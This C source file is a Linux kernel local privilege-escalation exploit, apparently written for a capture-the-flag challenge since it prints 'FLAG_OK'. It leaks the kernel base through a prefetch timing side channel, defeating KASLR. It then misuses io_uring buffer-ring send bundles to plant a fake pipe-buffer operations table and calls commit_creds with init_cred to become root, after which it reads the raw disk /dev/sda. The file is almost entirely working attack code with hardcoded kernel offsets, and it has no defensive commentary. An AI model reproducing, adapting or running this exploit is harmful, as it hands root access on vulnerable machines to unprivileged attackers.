#define _GNU_SOURCE
#include <linux/io_uring.h>
#include <stddef.h>
#include <stdint.h>

#define SYS_READ 0
#define SYS_WRITE 1
#define SYS_CLOSE 3
#define SYS_MMAP 9
#define SYS_IOCTL 16
#define SYS_PIPE 22
#define SYS_SCHED_SETAFFINITY 203
#define SYS_SCHED_YIELD 24
#define SYS_DUP 32
#define SYS_SOCKETPAIR 53
#define SYS_EXIT 60
#define SYS_FCNTL 72
#define SYS_FSYNC 74
#define SYS_GETUID 102
#define SYS_OPENAT 257
#define SYS_PIPE2 293
#define SYS_IO_URING_SETUP 425
#define SYS_IO_URING_ENTER 426
#define SYS_IO_URING_REGISTER 427

#define AT_FDCWD (-100)
#define O_RDONLY 0
#define O_NONBLOCK 04000
#define F_SETFL 4
#define F_SETPIPE_SZ 1031
#define F_GETPIPE_SZ 1032
#define AF_UNIX 1
#define SOCK_STREAM 1
#define PROT_READ 1
#define PROT_WRITE 2
#define MAP_PRIVATE 0x02
#define MAP_ANONYMOUS 0x20
#define MAP_SHARED 0x01
#define MAP_POPULATE 0x8000
#define MAP_FIXED 0x10

#define TEXT_OFF 0xffffffff81000000UL
#define COMMIT_CREDS_OFF 0x2dcfd0UL
#define INIT_CRED_OFF 0x200d700UL

#define NENT 256
#define NUSE 64
#define NPBUF 128
#define BSZ 64
#define BGID 0
#define MASK (NENT - 1)
#define NP_ALLOC 40
#define NP_RESIZE 40

static unsigned long sys5(unsigned long n, unsigned long a, unsigned long b,
			  unsigned long c, unsigned long d, unsigned long e)
{
	unsigned long r;
	register unsigned long r10 __asm__("r10") = d;
	register unsigned long r8 __asm__("r8") = e;
	__asm__ volatile("syscall"
			 : "=a"(r)
			 : "a"(n), "D"(a), "S"(b), "d"(c), "r"(r10), "r"(r8)
			 : "rcx", "r11", "memory");
	return r;
}
static unsigned long sys3(unsigned long n, unsigned long a, unsigned long b,
			  unsigned long c)
{
	unsigned long r;
	__asm__ volatile("syscall"
			 : "=a"(r)
			 : "a"(n), "D"(a), "S"(b), "d"(c)
			 : "rcx", "r11", "memory");
	return r;
}
static unsigned long sys1(unsigned long n, unsigned long a)
{
	unsigned long r;
	__asm__ volatile("syscall"
			 : "=a"(r)
			 : "a"(n), "D"(a)
			 : "rcx", "r11", "memory");
	return r;
}

static void *sys_mmap(unsigned long addr, unsigned long len, unsigned long prot,
		      unsigned long flags, unsigned long fd, unsigned long off)
{
	unsigned long r;
	register unsigned long r10 __asm__("r10") = flags;
	register unsigned long r8 __asm__("r8") = fd;
	register unsigned long r9 __asm__("r9") = off;
	__asm__ volatile("syscall"
			 : "=a"(r)
			 : "a"(SYS_MMAP), "D"(addr), "S"(len), "d"(prot), "r"(r10),
			   "r"(r8), "r"(r9)
			 : "rcx", "r11", "memory");
	return (void *)r;
}

static void *memset(void *s, int c, unsigned long n)
{
	unsigned char *p = s;
	while (n--)
		*p++ = (unsigned char)c;
	return s;
}

static long write_all(int fd, const void *b, long n)
{
	return (long)sys3(SYS_WRITE, fd, (unsigned long)b, n);
}

static int slen(const char *s)
{
	int n = 0;
	while (s[n])
		n++;
	return n;
}

static void puts_(const char *s)
{
	write_all(1, s, slen(s));
}

static void puthex(unsigned long v)
{
	char b[18];
	int i;
	b[0] = '0';
	b[1] = 'x';
	for (i = 0; i < 16; i++) {
		int n = (v >> (60 - 4 * i)) & 0xf;
		b[2 + i] = n < 10 ? '0' + n : 'a' + n - 10;
	}
	write_all(1, b, 18);
}

static void putdec(long v)
{
	char b[32];
	int n = 0, i;
	unsigned long u;
	if (v < 0) {
		write_all(1, "-", 1);
		u = (unsigned long)(-v);
	} else
		u = (unsigned long)v;
	if (!u) {
		write_all(1, "0", 1);
		return;
	}
	while (u) {
		b[n++] = '0' + (u % 10);
		u /= 10;
	}
	for (i = 0; i < n / 2; i++) {
		char t = b[i];
		b[i] = b[n - 1 - i];
		b[n - 1 - i] = t;
	}
	write_all(1, b, n);
}

static void die(const char *s)
{
	puts_(s);
	puts_("\n");
	sys1(SYS_EXIT, 1);
}

static uint64_t rdtsc(void)
{
	uint32_t a, d;
	__asm__ volatile("rdtsc" : "=a"(a), "=d"(d));
	return ((uint64_t)d << 32) | a;
}

#define PFETCH(p) __asm__ volatile(".byte 0x0f,0x18,0x00" ::"a"(p) : "memory")

static uint64_t time_pf(unsigned long p, int n)
{
	uint64_t best = ~0ULL;
	int i;
	for (i = 0; i < n; i++) {
		__asm__ volatile("lfence" ::: "memory");
		uint64_t t0 = rdtsc();
		PFETCH(p);
		__asm__ volatile("lfence" ::: "memory");
		uint64_t t1 = rdtsc();
		if (t1 - t0 < best)
			best = t1 - t0;
	}
	return best;
}

static unsigned long g_commit_creds;
static unsigned long g_init_cred;
static volatile int confirm_hit;

static int confirm_escalate(void *pipe, void *pbuf)
{
	void (*cc)(void *) = (void (*)(void *))g_commit_creds;
	(void)pipe;
	(void)pbuf;
	confirm_hit = 1;
	cc((void *)g_init_cred);
	return -14;
}

static struct {
	void *confirm, *release, *try_steal, *get;
} fake_ops;

static unsigned long leak_text(void)
{
	unsigned long map, unmap, thr;
	unsigned long best_start = 0, cur_start = 0, best_len = 0, cur_len = 0;
	unsigned long addr;
	int samples = 6;
	void *pg;

	pg = sys_mmap(0, 0x1000, PROT_READ | PROT_WRITE,
		      MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0);
	if ((long)pg < 0)
		die("mmap cal");
	*(volatile char *)pg = 1;

	map = time_pf((unsigned long)pg, 40);
	unmap = time_pf(0x1337000000UL, 40);
	puts_("[*] tmap=");
	puthex(map);
	puts_(" tunm=");
	puthex(unmap);
	puts_("\n");

	if (unmap < map + (map / 4) && unmap < map + 80) {
		puts_("[!] prefetch oracle weak; trying nokaslr\n");
		return TEXT_OFF;
	}
	thr = map + (unmap - map) / 3;
	puts_("[*] thr=");
	puthex(thr);
	puts_("\n");

	for (addr = TEXT_OFF; addr < 0xffffffffc0000000UL; addr += 0x200000UL) {
		uint64_t t = time_pf(addr, samples);
		int hit = t < thr;
		if (hit) {
			if (!cur_len)
				cur_start = addr;
			cur_len++;
			if (cur_len > best_len) {
				best_len = cur_len;
				best_start = cur_start;
			}
		} else
			cur_len = 0;
	}
	puts_("[*] kaslr run=");
	putdec((long)best_len);
	puts_(" start=");
	puthex(best_start);
	puts_("\n");
	if (best_len < 8)
		die("kaslr fail");
	return best_start;
}

struct uring {
	int fd;
	unsigned *sq_head, *sq_tail, *sq_mask, *sq_array;
	unsigned *cq_head, *cq_tail, *cq_mask;
	struct io_uring_sqe *sqes;
	struct io_uring_cqe *cqes;
	unsigned sqe_posted;
};

static void uring_init2(struct uring *r)
{
	struct io_uring_params p;
	void *sq, *cq;
	unsigned long sqsz, cqsz, ringsz;

	memset(&p, 0, sizeof(p));
	r->fd = (int)sys3(SYS_IO_URING_SETUP, 64, (unsigned long)&p, 0);
	if (r->fd < 0)
		die("io_uring_setup");
	sqsz = p.sq_off.array + p.sq_entries * sizeof(unsigned);
	cqsz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
	ringsz = sqsz > cqsz ? sqsz : cqsz;
	sq = sys_mmap(0, ringsz, PROT_READ | PROT_WRITE,
		      MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_SQ_RING);
	if ((long)sq < 0)
		die("mmap sq");
	if (p.features & IORING_FEAT_SINGLE_MMAP)
		cq = sq;
	else {
		cq = sys_mmap(0, cqsz, PROT_READ | PROT_WRITE,
			      MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_CQ_RING);
		if ((long)cq < 0)
			die("mmap cq");
	}
	r->sqes = sys_mmap(0, p.sq_entries * sizeof(struct io_uring_sqe),
			   PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, r->fd,
			   IORING_OFF_SQES);
	if ((long)r->sqes < 0)
		die("mmap sqes");
	r->sq_head = (unsigned *)((char *)sq + p.sq_off.head);
	r->sq_tail = (unsigned *)((char *)sq + p.sq_off.tail);
	r->sq_mask = (unsigned *)((char *)sq + p.sq_off.ring_mask);
	r->sq_array = (unsigned *)((char *)sq + p.sq_off.array);
	r->cq_head = (unsigned *)((char *)cq + p.cq_off.head);
	r->cq_tail = (unsigned *)((char *)cq + p.cq_off.tail);
	r->cq_mask = (unsigned *)((char *)cq + p.cq_off.ring_mask);
	r->cqes = (struct io_uring_cqe *)((char *)cq + p.cq_off.cqes);
	r->sqe_posted = 0;
}

static struct io_uring_sqe *get_sqe(struct uring *r)
{
	unsigned tail = *r->sq_tail;
	unsigned idx = tail & *r->sq_mask;
	r->sq_array[idx] = idx;
	memset(&r->sqes[idx], 0, sizeof(r->sqes[idx]));
	__asm__ volatile("" ::: "memory");
	*r->sq_tail = tail + 1;
	r->sqe_posted++;
	return &r->sqes[idx];
}

static int harvest(struct uring *r, int want)
{
	int n = 0;
	while (n < want) {
		unsigned head = *r->cq_head;
		if (head == *r->cq_tail) {
			long ret;
			register unsigned long r10 __asm__("r10") = IORING_ENTER_GETEVENTS;
			register unsigned long r8 __asm__("r8") = 0;
			register unsigned long r9 __asm__("r9") = 0;
			__asm__ volatile("syscall"
					 : "=a"(ret)
					 : "a"(SYS_IO_URING_ENTER), "D"(r->fd),
					   "S"(r->sqe_posted), "d"(1), "r"(r10), "r"(r8),
					   "r"(r9)
					 : "rcx", "r11", "memory");
			r->sqe_posted = 0;
			if (ret < 0)
				return -1;
			continue;
		}
		{
			struct io_uring_cqe cqe = r->cqes[head & *r->cq_mask];
			__asm__ volatile("" ::: "memory");
			*r->cq_head = head + 1;
			puts_("  cqe ");
			putdec(cqe.res);
			puts_("\n");
			n++;
			if (!(cqe.flags & IORING_CQE_F_MORE) && n >= 1 && want < 99)
				break;
		}
	}
	return n;
}

static void send_bundle(struct uring *r, int fd, unsigned len, unsigned ud)
{
	struct io_uring_sqe *sqe = get_sqe(r);
	sqe->opcode = IORING_OP_SEND;
	sqe->fd = fd;
	sqe->len = len;
	sqe->ioprio = IORING_RECVSEND_BUNDLE;
	sqe->flags = IOSQE_BUFFER_SELECT;
	sqe->buf_group = BGID;
	sqe->user_data = ud;
}

static struct io_uring_buf_ring *br;
static unsigned short br_tail;
static char bufs[256][BSZ];
static int nprovided;

static void provide(int n, int plant_ops)
{
	int i;
	for (i = 0; i < n; i++) {
		int id = nprovided % 256;
		struct io_uring_buf *b = &br->bufs[(br_tail + i) & MASK];
		if (plant_ops && i == 1)
			b->addr = (unsigned long)&fake_ops;
		else
			b->addr = (unsigned long)bufs[id];
		b->len = BSZ;
		b->bid = (unsigned short)id;
		nprovided++;
	}
	br_tail = (unsigned short)(br_tail + n);
	__asm__ volatile("" ::: "memory");
	br->tail = br_tail;
}

static void drain_sock(int fd)
{
	char drain[NUSE * BSZ];
	long ret;
	while ((ret = (long)sys3(SYS_READ, fd, (unsigned long)drain, sizeof(drain))) > 0)
		;
}

static int socketpair_u(int sv[2])
{
	return (int)sys5(SYS_SOCKETPAIR, AF_UNIX, SOCK_STREAM, 0, (unsigned long)sv, 0);
}

static void pin0(void)
{
	unsigned long mask = 1;
	sys5(SYS_SCHED_SETAFFINITY, 0, 8, (unsigned long)&mask, 0, 0);
}

static int do_exploit(void)
{
	struct uring ring;
	struct io_uring_buf_reg reg;
	int sv[2], i, ret;
	int p_alloc[NP_ALLOC][2];
	int p_resize[NP_RESIZE][2];
	char tmp[8];
	int uid0;

	confirm_hit = 0;
	nprovided = 0;
	br_tail = 0;

	if (socketpair_u(sv) < 0)
		die("socketpair");
	sys5(SYS_FCNTL, sv[1], F_SETFL, O_NONBLOCK, 0, 0);

	for (i = 0; i < NP_RESIZE; i++) {
		if ((int)sys3(SYS_PIPE2, (unsigned long)p_resize[i], 0, 0) < 0)
			die("pipe");
		if ((int)sys5(SYS_FCNTL, p_resize[i][0], F_SETPIPE_SZ, 4096, 0, 0) < 0)
			die("sz4k");
	}

	uring_init2(&ring);
	br = sys_mmap(0, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
		      (unsigned long)-1, 0);
	if ((long)br < 0)
		die("br");
	br->tail = 0;
	memset(&reg, 0, sizeof(reg));
	reg.ring_addr = (unsigned long)br;
	reg.ring_entries = NENT;
	reg.bgid = BGID;
	if ((int)sys5(SYS_IO_URING_REGISTER, ring.fd, IORING_REGISTER_PBUF_RING,
		      (unsigned long)&reg, 1, 0) < 0)
		die("pbuf");

	provide(NPBUF, 0);
	puts_("[*] send1\n");
	send_bundle(&ring, sv[0], NUSE * BSZ, 1);
	harvest(&ring, 8);
	drain_sock(sv[1]);

	for (i = 0; i < NP_ALLOC; i++) {
		if ((int)sys3(SYS_PIPE2, (unsigned long)p_alloc[i], 0, 0) < 0)
			die("pipeA");
		if ((int)sys3(SYS_WRITE, p_alloc[i][1], (unsigned long)"A", 1) != 1)
			die("wrA");
	}
	for (i = 0; i < NP_RESIZE; i++) {
		if ((int)sys5(SYS_FCNTL, p_resize[i][0], F_SETPIPE_SZ, 65536, 0, 0) < 0)
			die("sz64k");
		if ((int)sys3(SYS_WRITE, p_resize[i][1], (unsigned long)"R", 1) != 1)
			die("wrR");
	}

	provide(NUSE, 1);
	puts_("[*] send3\n");
	send_bundle(&ring, sv[0], NUSE * BSZ, 3);
	harvest(&ring, 8);
	drain_sock(sv[1]);

	for (i = 0; i < NP_ALLOC; i++) {
		sys3(SYS_READ, p_alloc[i][0], (unsigned long)tmp, 1);
		uid0 = (int)sys1(SYS_GETUID, 0);
		if (confirm_hit || uid0 == 0)
			goto win;
	}
	for (i = 0; i < NP_RESIZE; i++) {
		sys3(SYS_READ, p_resize[i][0], (unsigned long)tmp, 1);
		uid0 = (int)sys1(SYS_GETUID, 0);
		if (confirm_hit || uid0 == 0)
			goto win;
	}
	puts_("[-] MISS\n");
	return 1;

win:
	puts_("[+] uid=");
	putdec((long)sys1(SYS_GETUID, 0));
	puts_("\n");
	{
		int fd = (int)sys3(SYS_OPENAT, AT_FDCWD, (unsigned long)"/dev/sda", O_RDONLY);
		char buf[80];
		long nrd;
		if (fd < 0)
			die("sda");
		memset(buf, 0, sizeof(buf));
		nrd = (long)sys3(SYS_READ, fd, (unsigned long)buf, 64);
		if (nrd > 0)
			write_all(1, buf, nrd);
		puts_("\nFLAG_OK\n");
	}
	return 0;
}

void _start(void)
{
	unsigned long text;
	pin0();
	fake_ops.confirm = (void *)confirm_escalate;
	fake_ops.release = 0;
	fake_ops.try_steal = 0;
	fake_ops.get = 0;

	puts_("[*] leak kaslr\n");
	text = leak_text();
	g_commit_creds = text + COMMIT_CREDS_OFF;
	g_init_cred = text + INIT_CRED_OFF;
	puts_("[*] text=");
	puthex(text);
	puts_(" cc=");
	puthex(g_commit_creds);
	puts_(" ic=");
	puthex(g_init_cred);
	puts_("\n");

	sys1(SYS_EXIT, do_exploit());
}
